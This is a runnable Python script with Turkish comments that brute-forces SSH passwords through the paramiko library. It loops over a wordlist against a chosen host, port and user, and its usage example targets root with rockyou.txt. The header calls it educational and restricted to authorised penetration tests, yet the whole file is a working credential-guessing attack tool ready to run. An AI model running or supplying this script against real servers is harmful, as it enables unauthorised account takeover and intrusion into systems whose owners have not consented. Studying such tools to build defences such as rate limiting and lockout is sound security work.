#!/usr/bin/env python3
"""
SSH Brute-Force (Eğitim Amaçlı)
================================
Paramiko kütüphanesi gerektirir (pip install paramiko)
Yalnızca yetkili pentest'lerde kullanılmalıdır!
"""
import sys
import time
try:
    import paramiko
except ImportError:
    print("[-] Lütfen 'paramiko' kütüphanesini yükleyin: pip install paramiko")
    sys.exit(1)

def ssh_bruteforce(target, port, username, wordlist_path, delay=0.5):
    """SSH brute-force saldırısı"""
    print(f"[*] Hedef   : {target}:{port}")
    print(f"[*] Kullanıcı: {username}")
    print(f"[*] Wordlist : {wordlist_path}")
    print("-" * 50)

    attempts = 0
    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                password = line.strip()
                if not password:
                    continue

                attempts += 1
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(
                        target,
                        port=int(port),
                        username=username,
                        password=password,
                        timeout=5,
                        banner_timeout=5,
                        auth_timeout=5
                    )
                    print(f"\n[!] PAROLA BULUNDU!")
                    print(f"[+] {username}:{password}")
                    print(f"[+] Deneme sayısı: {attempts}")
                    client.close()
                    return password

                except paramiko.AuthenticationException:
                    print(f"  [{attempts}] Deneniyor: {password:<30} — Başarısız", end="\r")
                except paramiko.SSHException as e:
                    print(f"\n[!] SSH Hatası: {e} — 5sn bekleniyor...")
                    time.sleep(5)
                except Exception as e:
                    print(f"\n[-] Bağlantı hatası: {e}")
                    time.sleep(2)
                finally:
                    try:
                        client.close()
                    except:
                        pass

                time.sleep(delay)

    except FileNotFoundError:
        print(f"[-] Wordlist bulunamadı: {wordlist_path}")
        return None

    print(f"\n[-] Parola bulunamadı. Toplam {attempts} deneme yapıldı.")
    return None

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Kullanım: python SSH_Bruteforce.py <HEDEF_IP> <KULLANICI> <WORDLIST>")
        print("Örnek  : python SSH_Bruteforce.py 192.168.1.100 root rockyou.txt")
        print("\nOpsiyonel: python SSH_Bruteforce.py <IP> <USER> <WORDLIST> <PORT>")
        sys.exit(1)

    target = sys.argv[1]
    user = sys.argv[2]
    wordlist = sys.argv[3]
    port = sys.argv[4] if len(sys.argv) > 4 else "22"

    ssh_bruteforce(target, port, user, wordlist)
